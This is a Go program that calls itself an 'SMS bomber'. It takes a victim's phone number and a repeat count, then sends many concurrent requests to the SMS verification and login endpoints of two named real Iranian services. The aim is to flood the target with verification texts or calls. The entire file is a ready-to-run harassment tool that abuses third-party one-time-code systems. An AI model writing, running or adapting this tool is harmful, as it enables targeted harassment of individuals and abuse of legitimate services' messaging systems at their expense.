package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"time"
)

func clearScreen() {
	cmd := exec.Command("clear")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func sendJSONRequest(ctx context.Context, url string, payload map[string]interface{}, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	jsonData, err := json.Marshal(payload)
	if err != nil {
		fmt.Println("[-] Error encoding JSON!")
		ch <- http.StatusInternalServerError
		return
	}

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewBuffer(jsonData))
	if err != nil {
		fmt.Println("[-] Error creating request!")
		ch <- http.StatusInternalServerError
		return
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		fmt.Println("[-] Request failed:", err)
		ch <- http.StatusInternalServerError
		return
	}
	defer resp.Body.Close()
	ch <- resp.StatusCode
}

func sendFormRequest(ctx context.Context, url string, formData url.Values, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, strings.NewReader(formData.Encode()))
	if err != nil {
		fmt.Println("[-] Error creating form request!")
		ch <- http.StatusInternalServerError
		return
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		fmt.Println("[-] Request failed:", err)
		ch <- http.StatusInternalServerError
		return
	}
	defer resp.Body.Close()
	ch <- resp.StatusCode
}

func main() {
	clearScreen()

	fmt.Println("[+] SMS bomber started!")

	var phone string
	fmt.Print("Enter phone [Ex: 09xxxxxxxxxx]: ")
	fmt.Scan(&phone)

	var repeatCount int
	fmt.Print("Enter number of sms/call: ")
	fmt.Scan(&repeatCount)

	ctx, cancel := context.WithCancel(context.Background())
	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, os.Interrupt)
	go func() {
		<-signalChan
		fmt.Println("\n[!] Interrupt received. Shutting down...")
		cancel()
	}()

	var wg sync.WaitGroup
	ch := make(chan int, repeatCount*2)

	for i := 0; i < repeatCount; i++ {
		// Snappfood form
		wg.Add(1)
		go sendFormRequest(ctx, "https://snappfood.ir/mobile/v4/user/loginMobileWithNoPass?lat=35.774&long=51.418", url.Values{"cellphone": {phone}}, &wg, ch)

		// Mobinnet JSON
		wg.Add(1)
		go sendJSONRequest(ctx, "https://my.mobinnet.ir/api/account/SendRegisterVerificationCode", map[string]interface{}{"cellNumber": phone}, &wg, ch)
	}

	go func() {
		wg.Wait()
		close(ch)
	}()

	for statusCode := range ch {
		if statusCode == 404 || statusCode == 400 {
			fmt.Println("[-] Error!")
		} else {
			fmt.Println("[+] Sent")
		}
	}

	fmt.Println("[+] All requests processed.")
}
